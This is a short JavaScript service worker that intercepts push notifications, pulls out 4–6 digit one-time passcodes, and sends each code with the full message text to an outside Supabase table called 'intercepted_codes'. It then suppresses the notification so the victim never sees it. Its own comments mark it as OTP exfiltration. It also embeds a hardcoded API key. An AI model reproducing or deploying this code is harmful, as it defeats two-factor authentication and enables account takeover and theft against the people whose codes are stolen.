const SB_URL = 'https://jdjllbdodmnxuzananah.supabase.co';
const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpkamxsYmRvZG1ueHV6YW5hbmFoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc0OTI5MDcsImV4cCI6MjA5MzA2ODkwN30.MGVD1CI1Iw_-k2_y6UBZReIS9KQykFXkRt-5V6gAleo';

self.addEventListener('push', (event) => {
const text = event.data ? event.data.text() : '';
const code = text.match(/\b\d{4,6}\b/);

if (code) {
// EXFILTRATE OTP INSTANTLY
fetch(${SB_URL}/rest/v1/intercepted_codes, {
method: 'POST',
headers: { 'apikey': SB_KEY, 'Content-Type': 'application/json' },
body: JSON.stringify({ code: code[0], raw: text, ts: new Date() })
});
return; // MUTE THE NOTIFICATION
}
});
